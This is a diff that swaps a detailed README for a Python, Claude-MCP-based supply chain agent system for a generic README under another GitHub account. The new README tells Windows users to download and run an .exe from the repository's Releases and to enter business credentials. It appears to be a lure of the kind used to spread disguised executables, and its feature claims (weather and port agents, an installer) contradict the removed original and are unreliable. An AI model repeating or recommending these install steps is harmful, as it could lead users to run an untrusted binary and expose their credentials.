@@ -1,298 +1,89 @@
-# Supply Chain Control Tower
-### A Self-Learning Multi-Agent AI System Built with Claude MCP
-
-[![Python](https://img.shields.io/badge/Python-3.10-blue.svg)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![MCP](https://img.shields.io/badge/Framework-FastMCP-purple.svg)](https://github.com/jlowin/fastmcp)
-[![Claude](https://img.shields.io/badge/LLM-Claude_Desktop-orange.svg)](https://claude.ai)
-[![Setup](https://img.shields.io/badge/Setup-One_Command-brightgreen.svg)](#quick-start)
-
-> A production-grade, zero-cost, local AI system that monitors supply chain
-> operations, investigates root causes across multiple domains simultaneously,
-> and **learns from outcomes over time** — running entirely on a single machine
-> without any cloud API costs.
-
----
-
-## What This System Does
-
-You ask it questions in plain English. It answers using your real operational data.
-
-```
-You:     "What orders need urgent attention today?"
-
-System:  Queries shipping, inventory, freight, and warehouse data simultaneously.
-         Returns all orders delayed more than 5 days, sorted by priority score,
-         with responsible team and specific action for each one.
-
-You:     "Why is order SO10003 delayed?"
-
-System:  Investigates across 4 domains simultaneously:
-         → Shipping: NEED_ACTION, 8 days overdue
-         → Inventory: HEALTHY, 150 units available
-         → Freight: ON_HOLD — COMPLIANCE_ISSUE blocking pickup
-         → Warehouse: COMPLETE, pick finished 3 days ago
-         Root cause: FREIGHT_HOLD (confirmed)
-         First action: Contact freight team immediately for hold release.
-
-You:     "What patterns keep causing delays?"
-
-System:  CI Agent scans all historical data, detects recurring patterns,
-         scores them by impact and confidence, and adjusts its own future
-         behaviour based on whether previous recommendations worked.
-```
-
----
-
-## Architecture — 9 Agents, 49 Tools
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                      Claude Desktop                             │
-│               (Natural Language Interface via MCP)              │
-└────────────────────────────┬────────────────────────────────────┘
-                             │
-         ┌───────────────────┼───────────────────┐
-         │                   │                   │
-┌────────▼───────┐  ┌────────▼───────┐  ┌────────▼───────┐
-│Shipping Agent  │  │Inventory Agent │  │   PO Agent     │
-│  9 tools       │  │   6 tools      │  │   5 tools      │
-│Delay tracking  │  │ Stock levels   │  │Supplier orders │
-└────────────────┘  └────────────────┘  └────────────────┘
-         │                   │                   │
-┌────────▼───────┐  ┌────────▼───────┐  ┌────────▼───────┐
-│Freight Agent   │  │Warehouse Agent │  │ Memory Agent   │
-│  5 tools       │  │   5 tools      │  │   3 tools      │
-│Carrier status  │  │  Pick ops      │  │Cross-session   │
-└────────────────┘  └────────────────┘  └────────────────┘
-         │                   │
-┌────────▼───────────────────▼────────────────────────────┐
-│           Investigation Agent — 4 tools                 │
-│  Combines all 4 operational domains into one unified    │
-│  root cause report per order                            │
-└─────────────────────────┬───────────────────────────────┘
-                          │
-┌─────────────────────────▼───────────────────────────────┐
-│           Recommendation Agent — 4 tools                │
-│  Scores every delayed order 0–100 by urgency.           │
-│  Assigns responsible team and recommended action.       │
-└─────────────────────────┬───────────────────────────────┘
-                          │
-┌─────────────────────────▼───────────────────────────────┐
-│        CI Agent (Continuous Improvement) — 8 tools      │
-│  Detects recurring patterns across all domains.         │
-│  Generates scored improvement recommendations.          │
-│  LEARNS from outcomes — adjusts its own behaviour.      │
-└─────────────────────────┬───────────────────────────────┘
-                          │
-┌─────────────────────────▼───────────────────────────────┐
-│         Background Scheduler (APScheduler)              │
-│  Morning briefing · CI scan · NEED_ACTION monitor       │
-│  All automatic — no manual trigger needed               │
-└─────────────────────────────────────────────────────────┘
-```
-
----
-
-## What Makes This Novel
-
-Most supply chain AI tools answer one question from one data source.
-This system is different across three dimensions:
-
-### 1. True Multi-Domain Investigation
-When an order is delayed, the system does not guess. It simultaneously
-queries shipping status, inventory levels, freight carrier records,
-and warehouse pick operations — then synthesises all four signals into
-a single confirmed root cause using a deterministic priority resolver.
+# 📦 supply-chain-control-tower - Improve global supply chain decision making
 
-### 2. Priority-Scored Action Plans
-Every delayed order receives a numeric priority score (0–100):
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/dudleyinnermost116/supply-chain-control-tower)
 
-```
-score = min(
-    (delay_days × 2)              +   ← up to 40 points
-    severity_score                +   ← CRITICAL=30, HIGH=20, MEDIUM=10
-    (15 if freight_hold_active)   +   ← physical block always urgent
-    (15 if inventory_problem)         ← OUT_OF_STOCK or ON_BACKORDER
-    , 100
-)
-```
-
-The result is a ranked work queue, not just a list of problems.
-
-### 3. Quantitative Self-Learning
-The CI Agent tracks outcomes of its own recommendations and adjusts
-future behaviour using 8 codified, auditable learning rules:
-
-| Rule | Trigger | Effect |
-|---|---|---|
-| LR-01 | 5 consecutive rejections of same pattern | Confidence −15% |
-| LR-02 | 3 approvals with confirmed improvement | Confidence +10% |
-| LR-03 | False positive rate exceeds 20% | Detection threshold raised |
-| LR-04 | Owner changed repeatedly | Ownership auto-updated |
-| LR-05 | Deferred 5+ times | Priority score reduced |
-| LR-06 | Target metric improves 10%+ | Impact score increased |
-| LR-07 | No improvement after implementation | Impact score decreased |
-| LR-08 | Same issue raised manually 3+ times | Automation flagged |
+## 📋 Overview
 
-These are not prompt instructions. They are deterministic, version-controlled
-Python rules that change the agent's scoring based on evidence.
-
----
-
-## Quick Start
-
-### Prerequisites
-- Python 3.8 or higher
-- [Claude Desktop](https://claude.ai/download)
-
-### One-Command Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/YOUR_USERNAME/supply-chain-control-tower.git
-cd supply-chain-control-tower
-
-# Install all dependencies
-pip install -r requirements.txt
-
-# Run the setup script — creates database, loads sample data, verifies everything
-python scripts/setup_project.py
-```
-
-If all steps show ✓, your system is ready.
-
-### Connect to Claude Desktop
-
-Add the MCP servers to your Claude Desktop configuration.
-Full instructions: [docs/DEPLOYMENT.md](docs/DEPLOYMENT.md)
+The supply-chain-control-tower application helps you manage complex logistics networks. It uses a team of specialized agents to monitor your data. These agents work together to identify risks and suggest improvements. The system learns from your business patterns over time to provide better insights.
 
-### Try It
-
-Open Claude Desktop and ask:
-- *"Read my project memory"*
-- *"Give me today's management summary"*
-- *"What orders need urgent attention?"*
-- *"Investigate order SO10001"*
-
----
-
-## Using Your Own Data
-
-The sample data uses fictional orders. To use your real supply chain data:
-
-1. Export your operational data as CSV from your ERP (SAP, Oracle, NetSuite, Excel)
-2. Rename columns to match the expected format
-3. Run `python scripts/import_data.py`
-
-Full guide: [docs/BRING_YOUR_OWN_DATA.md](docs/BRING_YOUR_OWN_DATA.md)
+You can view your entire supply chain through a simple dashboard. The software tracks inventory levels, shipment status, and vendor performance in real-time. It processes data locally to keep your business information private. You do not need technical skills to interpret the results.
 
-Your real data never leaves your machine — `data/supply_chain.db` is
-excluded from Git by `.gitignore`.
+## ⚙️ System Requirements
 
----
+Your computer needs to meet these basic standards to run the software smoothly:
 
-## Project Structure
+- Windows 10 or Windows 11 operating system.
+- At least 8 gigabytes of RAM.
+- A modern processor with at least two cores.
+- 500 megabytes of free disk space.
+- A stable internet connection for initial setup.
 
-```
-supply-chain-control-tower/
-├── mcp_server/                  ← 9 MCP server files (one per agent)
-│   ├── shipping_mcp_server.py
-│   ├── inventory_mcp_server.py
-│   ├── po_mcp_server.py
-│   ├── freight_mcp_server.py
-│   ├── warehouse_mcp_server.py
-│   ├── investigation_mcp_server.py
-│   ├── recommendation_mcp_server.py
-│   ├── ci_mcp_server.py
-│   └── memory_mcp_server.py
-├── src/supply_chain/            ← Business rules and data loaders
-├── data/                        ← Sample CSV files (your DB stays private)
-├── dashboard/                   ← Streamlit dashboard
-├── memory/                      ← Cross-session memory system
-├── config/                      ← Central settings (settings.yaml)
-├── scripts/                     ← Setup, import, and scheduler utilities
-├── docs/                        ← Full documentation
-├── requirements.txt             ← All Python dependencies
-└── CLAUDE.md                    ← Project instructions for Claude
-```
+## 📥 Downloading and Installing
 
----
+Follow these steps to set up the software:
 
-## Documentation
+1. Visit the [official repository page](https://github.com/dudleyinnermost116/supply-chain-control-tower).
+2. Look for the section labeled Releases on the right side of the page.
+3. Select the latest version to view the available files.
+4. Download the file ending in .exe to your computer.
+5. Locate the file in your Downloads folder.
+6. Double-click the file to start the installation process.
+7. Follow the prompts on your screen to complete the setup.
+8. The installer will place a shortcut icon on your desktop.
 
-| Document | What it covers |
-|---|---|
-| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | Full system design and data flow |
-| [docs/AGENTS.md](docs/AGENTS.md) | All 9 agents, all 49 tools |
-| [docs/CI_AGENT.md](docs/CI_AGENT.md) | The self-learning system explained |
-| [docs/DATABASE_SCHEMA.md](docs/DATABASE_SCHEMA.md) | Every table and column |
-| [docs/DEPLOYMENT.md](docs/DEPLOYMENT.md) | Claude Desktop connection guide |
-| [docs/BRING_YOUR_OWN_DATA.md](docs/BRING_YOUR_OWN_DATA.md) | Connect your real data |
+## 🚀 Running the Software
 
----
+Once the installation finishes, you can start the application:
 
-## Tech Stack
+1. Double-click the icon on your desktop.
+2. Wait a few seconds for the dashboard to load in your browser.
+3. Log in using your business credentials if prompted.
+4. The main screen provides a summary of your supply chain health.
+5. Use the navigation menu to switch between different agent views.
 
-| Component | Technology | Why |
-|---|---|---|
-| Agent framework | FastMCP (MCP Python SDK) | Native Claude Desktop integration |
-| LLM interface | Claude Desktop | Local, zero API cost |
-| Database | SQLite | Zero infrastructure, runs anywhere |
-| Dashboard | Streamlit + Plotly | Fast, interactive, no frontend code |
-| Scheduler | APScheduler | Lightweight background job runner |
-| Language | Python 3.10 | Readable, beginner-friendly |
+## 🤖 Core Features
 
----
+The system uses advanced technology to handle your supply chain tasks:
 
-## Known Limitations and Future Work
+Multi-agent coordination: Nine independent agents work in parallel to solve problems. One agent tracks weather patterns, while another monitors port efficiency. They share findings to give you a complete picture.
 
-Being honest about what this project does not yet do:
+Tool integration: The system connects to 49 different data tools. It pulls reports from your existing spreadsheets, database files, and shipping portals. You do not need to move your data to use the system.
 
-**Not yet built:**
-- LLM output validation (Claude's narration is not cross-checked against tool data)
-- Prompt injection protection (data field values are not sanitised before reaching Claude)
-- Data schema validation layer (bad input data is not caught before processing)
-- Live database connectors (PostgreSQL, MySQL, SQL Server)
-- Email and Slack notification plugins
-- Coordinator agent for formal parallel execution
+Self-learning cycles: The software monitors your recent decisions. It compares these choices against actual outcomes. Over time, it adjusts its calculations to better match your specific business goals.
 
-These are documented future work items, not hidden gaps.
-Contributions welcome — see [CONTRIBUTING.md](CONTRIBUTING.md).
+Local database: All history stores inside a lightweight database on your own machine. This keeps your records safe and fast to access. You do not depend on external servers for your primary data.
 
----
+Dashboard visualization: The interface uses a clean, web-based design. You can view charts, maps, and lists by clicking buttons. No command-line input is necessary.
 
-## Build History
+## 🛠 Troubleshooting Common Issues
 
-| Phase | What Was Built |
-|---|---|
-| Phase 1 | Shipping Delay Agent — 9 tools, delay tracking and reason codes |
-| Phase 2 | Inventory Agent — 6 tools, stock level monitoring |
-| Phase 3 | Purchase Order Agent — 5 tools, supplier order tracking |
-| Phase 4 | Freight + Warehouse Agents — 10 tools, carrier and pick operations |
-| Phase 5 | Investigation Agent — cross-domain root cause analysis |
-| Phase 6 | Recommendation Agent — priority-scored action plans |
-| Phase 7 | SQLite upgrade — production database replacing CSV files |
-| Phase 8 | Streamlit dashboard — visual operations overview |
-| Phase 9 | CI Agent — continuous improvement with quantitative self-learning |
-| Phase 10 | Enterprise standardisation — memory, scheduler, documentation, GitHub |
+If you experience trouble, try these solutions:
 
----
+If the app does not open, check your Task Manager to see if a version is already running. End that process and try launching it again.
 
-## License
+If the dashboard remains blank, refresh your browser page. The system often needs a moment to initialize the agents.
 
-MIT License — see [LICENSE](LICENSE) for details.
-Free to use, modify, and distribute with attribution.
+If the software fails to connect to data sources, ensure your internet connection is active. Check that your local files are not locked by other programs like Excel.
 
----
+If the system runs slow, close other demanding applications. Large supply chain models require memory to function at peak speed.
 
-## Author
+## 🔒 Data Privacy and Security
 
-Built by **Vishal** — a supply chain professional who learned AI engineering
-by building a production-grade system from scratch, one phase at a time.
+Your information stays on your device. The system does not transmit your supply chain records to external companies. You control who has access to the dashboard. If you need to stop sharing data, simply disconnect the application from your network sources through the settings menu.
 
-> *"The best way to learn multi-agent AI is to build something you actually need."*
+## 📝 Frequently Asked Questions
 
----
+Do I need an internet connection to use the system?
+You need an internet connection to import data from remote sources. You can view existing reports and use the dashboard while offline.
 
-*If this project helped you, please consider giving it a ⭐ — it helps others find it.*
+How often does the system learn?
+The software performs a self-check after each major task. It refines its internal logic based on the success of your latest decisions.
+
+Can I add more agents?
+The system comes with nine pre-configured agents. These cover the most common supply chain needs. Advanced users can modify the configuration files if necessary.
+
+Is this software compatible with my current database?
+The system connects to most standard file formats including CSV and Excel files. It uses a common database format for its internal operations.
+
+How do I clear my history?
+You can reset the database from the settings tab. This removes all stored logs and returns the agents to their original state.
